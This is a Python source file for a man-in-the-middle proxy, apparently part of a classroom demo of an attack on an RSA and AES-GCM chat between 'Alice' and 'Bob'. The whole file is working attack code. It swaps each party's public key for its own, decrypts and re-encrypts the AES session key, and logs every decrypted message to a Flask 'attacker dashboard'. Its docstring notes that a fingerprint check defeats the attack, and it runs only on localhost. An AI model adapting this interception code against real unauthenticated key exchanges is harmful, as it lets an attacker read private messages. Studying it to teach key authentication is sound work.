"""
mitm.py
Role: MITM proxy — TCP proxy on port 8080 that intercepts, decrypts, and
      re-encrypts RSA+AES-GCM traffic between Alice and Bob.

      Also runs a Flask API on port 7000 that powers the attacker dashboard.

Usage:
    python mitm.py

Architecture — shared session state
────────────────────────────────────
Each client (Alice / Bob) gets its own TCP connection to the MITM listener,
and the MITM opens a matching upstream TCP connection to the real server.
Both connections belong to the SAME logical session and must share one state
dict so that:
  • Alice's session_key handler can read Bob's real public key (captured when
    Bob's key_exchange was processed) and re-encrypt the AES key for Bob.
  • If Bob hasn't arrived yet, we block until he does (using an Event) instead
    of silently dropping the re-encryption step.

Session pairing: the MITM accepts connections sequentially and pairs them
FIFO — first connection = Alice, second = Bob.  A threading.Event is used to
signal "Bob's real pub key is now available".

Acts it enables:
    Act 1  — plain traffic just passes through; Burp Suite does the reading
    Act 2  — active key swap + AES-GCM decryption of every message
    Act 3  — key swap happens but fingerprint check defeats it (clients abort)
"""

import socket
import threading
import json
import time
import base64
import os

from flask import Flask, jsonify
from flask_cors import CORS

from crypto_utils import (
    generate_rsa_keypair,
    serialize_public_key,
    deserialize_public_key,
    rsa_decrypt,
    rsa_encrypt,
    aes_decrypt,
    key_fingerprint,
)

LISTEN_HOST  = "127.0.0.1"
LISTEN_PORT  = 8080        # Alice and Bob connect here
SERVER_HOST  = "127.0.0.1"
SERVER_PORT  = 9000        # real relay server
FLASK_PORT   = 7000        # dashboard API

# ─────────────────────────────────────────────
# MITM's own RSA key pair (one pair, reused across sessions for simplicity)
# ─────────────────────────────────────────────
mitm_priv, mitm_pub = generate_rsa_keypair()
mitm_pub_pem  = serialize_public_key(mitm_pub).decode()
mitm_pub_fp   = key_fingerprint(mitm_pub)

# ─────────────────────────────────────────────
# Attack log — written by proxy threads, read by Flask
# ─────────────────────────────────────────────
attack_log: list[dict] = []
log_lock = threading.Lock()


def log_event(event: str, sender: str, content: str) -> None:
    """Append an intercept event to the attack_log."""
    entry = {
        "time":    time.strftime("%H:%M:%S"),
        "event":   event,      # KEY_SWAP | DECRYPTED | SESSION_KEY | RELAYED | SESSION_ABORT
        "sender":  sender,
        "content": content,
    }
    with log_lock:
        attack_log.append(entry)
        if len(attack_log) > 200:
            attack_log.pop(0)
    tag = {
        "KEY_SWAP":      "⚠  KEY SWAP",
        "DECRYPTED":     "🔓 DECRYPTED",
        "SESSION_KEY":   "🔑 SESSION KEY",
        "SESSION_ABORT": "✗  ABORT",
        "RELAYED":       "→  RELAY",
    }.get(event, event)
    print(f"[MITM] {tag} | {sender} | {content[:120]}")


# ─────────────────────────────────────────────
# Shared session state
# ─────────────────────────────────────────────

def new_session() -> dict:
    """
    Return a fresh SHARED session state dict.
    Both the Alice-pipe and the Bob-pipe reference the same object.
    """
    return {
        # Real public keys captured from key_exchange messages
        "alice_real_pub":  None,
        "bob_real_pub":    None,

        # AES session key (same key, MITM sits in the middle of both channels)
        "alice_aes_key":   None,
        "bob_aes_key":     None,

        # Events — set when the corresponding real pub key has been saved
        "bob_pub_ready":   threading.Event(),   # set when bob_real_pub is populated
        "alice_pub_ready": threading.Event(),   # set when alice_real_pub is populated

        "lock": threading.Lock(),
    }


# Pending sessions: first connection waits here for the second to arrive
# so they can share the same state dict.
_pending_session: dict | None = None
_pending_lock = threading.Lock()


def get_or_create_session() -> dict:
    """
    Pair incoming connections FIFO into shared sessions.
    First caller creates a session and parks it.
    Second caller takes it (both now share the same dict).
    """
    global _pending_session
    with _pending_lock:
        if _pending_session is None:
            s = new_session()
            _pending_session = s
            return s
        else:
            s = _pending_session
            _pending_session = None
            return s


# ─────────────────────────────────────────────
# Message processing  (client → server direction)
# ─────────────────────────────────────────────

def process_client_to_server(raw_json: dict, state: dict) -> dict:
    """
    Intercept a message coming FROM a client (Alice/Bob) TOWARD the server.

    key_exchange  → save real pub key, replace with MITM's pub key
    session_key   → RSA-decrypt (Alice used MITM's pub key), then WAIT for
                    Bob's real pub key and re-encrypt for Bob
    message       → AES-decrypt and log plaintext, forward ciphertext unchanged
    """
    mtype  = raw_json.get("type")
    sender = raw_json.get("sender", "?")

    if mtype == "key_exchange":
        real_pub = deserialize_public_key(raw_json["public_key"])
        with state["lock"]:
            if sender == "alice":
                state["alice_real_pub"] = real_pub
                state["alice_pub_ready"].set()
            else:
                state["bob_real_pub"] = real_pub
                state["bob_pub_ready"].set()
        # Replace public key with MITM's own
        raw_json["public_key"] = mitm_pub_pem
        log_event("KEY_SWAP", sender,
                  f"Swapped {sender}'s RSA public key with MITM's key")

    elif mtype == "session_key":
        # Alice encrypted the AES key with MITM's pub key (she thinks it's Bob's)
        enc_bytes = base64.b64decode(raw_json["encrypted_key"])
        try:
            aes_key = rsa_decrypt(mitm_priv, enc_bytes)
            with state["lock"]:
                state["alice_aes_key"] = aes_key
                state["bob_aes_key"]   = aes_key   # same key — MITM is in the middle
            log_event("SESSION_KEY", sender,
                      f"Decrypted Alice's AES session key: {aes_key.hex()[:16]}…")

            # ── KEY FIX: wait for Bob's real public key before re-encrypting ──
            # Bob may not have sent his key_exchange yet.  Block here (max 10 s)
            # rather than silently skipping re-encryption.
            got_bob_key = state["bob_pub_ready"].wait(timeout=10.0)
            if not got_bob_key:
                log_event("SESSION_KEY", sender,
                          "Timed out waiting for Bob's real public key — re-encryption skipped!")
            else:
                with state["lock"]:
                    bob_real_pub = state["bob_real_pub"]
                re_encrypted = rsa_encrypt(bob_real_pub, aes_key)
                raw_json["encrypted_key"] = base64.b64encode(re_encrypted).decode()
                log_event("SESSION_KEY", sender,
                          "Re-encrypted AES key with Bob's real public key ✓")

        except Exception as e:
            log_event("SESSION_KEY", sender, f"RSA decrypt failed: {e}")

    elif mtype == "message":
        with state["lock"]:
            aes_key = state["alice_aes_key"] if sender == "alice" else state["bob_aes_key"]
        if aes_key:
            try:
                plaintext = aes_decrypt(aes_key, raw_json["nonce"], raw_json["ciphertext"])
                log_event("DECRYPTED", sender, plaintext)
            except Exception as e:
                log_event("DECRYPTED", sender, f"<decrypt error: {e}>")

    return raw_json


# ─────────────────────────────────────────────
# Message processing  (server → client direction)
# ─────────────────────────────────────────────

def process_server_to_client(raw_json: dict, state: dict) -> dict:
    """
    Intercept a message coming FROM the server TOWARD a client.

    IMPORTANT: By the time a key_exchange reaches this path the c2s handler has
    *already* (a) saved the real public key and (b) replaced it with MITM's key.
    What the server relays onward is therefore MITM's own PEM — re-capturing it
    here would overwrite the real key with the MITM key and break re-encryption.
    So we ONLY do the key-swap (to ensure the far client also sees MITM's key)
    but we do NOT update state['bob_real_pub'] / state['alice_real_pub'].
    """
    mtype  = raw_json.get("type")
    sender = raw_json.get("sender", "?")

    if mtype == "key_exchange":
        # The PEM in the message is already MITM's key (swapped by c2s path).
        # Just make sure the receiving client definitely gets MITM's key.
        raw_json["public_key"] = mitm_pub_pem
        log_event("KEY_SWAP", sender,
                  f"Confirmed MITM key on server→client path for {sender}")

    elif mtype == "message":
        with state["lock"]:
            aes_key = state["bob_aes_key"] if sender == "bob" else state["alice_aes_key"]
        if aes_key:
            try:
                plaintext = aes_decrypt(aes_key, raw_json["nonce"], raw_json["ciphertext"])
                log_event("DECRYPTED", sender, plaintext)
            except Exception:
                pass   # plain-mode message — fine

    return raw_json


# ─────────────────────────────────────────────
# TCP pipe helpers
# ─────────────────────────────────────────────

def pipe(src: socket.socket, dst: socket.socket,
         state: dict, direction: str, done_event: threading.Event) -> None:
    """
    Read newline-delimited JSON from src, optionally modify, forward to dst.
    direction: 'c2s' (client→server) or 's2c' (server→client)
    """
    buffer = b""
    try:
        while not done_event.is_set():
            chunk = src.recv(4096)
            if not chunk:
                break
            buffer += chunk
            while b"\n" in buffer:
                line, buffer = buffer.split(b"\n", 1)
                try:
                    msg = json.loads(line)
                    if direction == "c2s":
                        msg = process_client_to_server(msg, state)
                    else:
                        msg = process_server_to_client(msg, state)
                    dst.sendall(json.dumps(msg).encode() + b"\n")
                except json.JSONDecodeError:
                    # Not JSON (plain-mode raw data) — forward as-is
                    dst.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        done_event.set()


def handle_client(client_sock: socket.socket, addr: tuple) -> None:
    """
    Handle one client connection: open a matching server connection and pipe
    both ways.  Both Alice's and Bob's handlers share the same session state.
    """
    global _pending_session
    print(f"[MITM] New connection from {addr}")

    # ── Shared session — both Alice and Bob get the same dict ──
    state = get_or_create_session()
    done  = threading.Event()

    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect((SERVER_HOST, SERVER_PORT))
    except ConnectionRefusedError:
        print(f"[MITM] Cannot reach server at {SERVER_HOST}:{SERVER_PORT}")
        # If we created a pending session but can't reach the server, clean it up
        # so the next incoming connection isn't ghost-paired with this failed one.
        with _pending_lock:
            if _pending_session is state:
                _pending_session = None
        client_sock.close()
        return

    t1 = threading.Thread(target=pipe,
                          args=(client_sock, server_sock, state, "c2s", done), daemon=True)
    t2 = threading.Thread(target=pipe,
                          args=(server_sock, client_sock, state, "s2c", done), daemon=True)
    t1.start()
    t2.start()
    done.wait()   # block until one direction closes
    done.set()    # signal the other
    client_sock.close()
    server_sock.close()
    print(f"[MITM] Connection from {addr} closed.")


# ─────────────────────────────────────────────
# TCP proxy main loop
# ─────────────────────────────────────────────

def proxy_server() -> None:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(10)
    print(f"[MITM] Proxy listening on {LISTEN_HOST}:{LISTEN_PORT}"
          f" → forwarding to {SERVER_HOST}:{SERVER_PORT}")
    while True:
        conn, addr = srv.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        t.start()


# ─────────────────────────────────────────────
# Flask dashboard API
# ─────────────────────────────────────────────

app = Flask(__name__)
CORS(app)   # allow the dashboard HTML (file://) to call the API


@app.route("/api/log")
def api_log():
    """Return the last 50 intercept events as JSON."""
    with log_lock:
        return jsonify(attack_log[-50:])


@app.route("/api/stats")
def api_stats():
    """Return summary counts for the dashboard header."""
    with log_lock:
        log = list(attack_log)
    return jsonify({
        "total":     len(log),
        "decrypted": sum(1 for e in log if e["event"] == "DECRYPTED"),
        "key_swaps": sum(1 for e in log if e["event"] == "KEY_SWAP"),
        "aborts":    sum(1 for e in log if e["event"] == "SESSION_ABORT"),
    })


def start_flask() -> None:
    """Start Flask in a background daemon thread."""
    app.run(host="127.0.0.1", port=FLASK_PORT, debug=False, use_reloader=False)


# ─────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────

def main() -> None:
    print("=" * 60)
    print("  MITM PROXY + ATTACKER DASHBOARD")
    print("=" * 60)
    print(f"  Proxy         : {LISTEN_HOST}:{LISTEN_PORT}  →  {SERVER_HOST}:{SERVER_PORT}")
    print(f"  Dashboard API : http://127.0.0.1:{FLASK_PORT}/api/log")
    print(f"  MITM fingerprint: {mitm_pub_fp}")
    print("=" * 60)
    print()

    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    print(f"[MITM] Dashboard API running on http://127.0.0.1:{FLASK_PORT}")

    try:
        proxy_server()
    except KeyboardInterrupt:
        print("\n[MITM] Shutting down.")


if __name__ == "__main__":
    main()
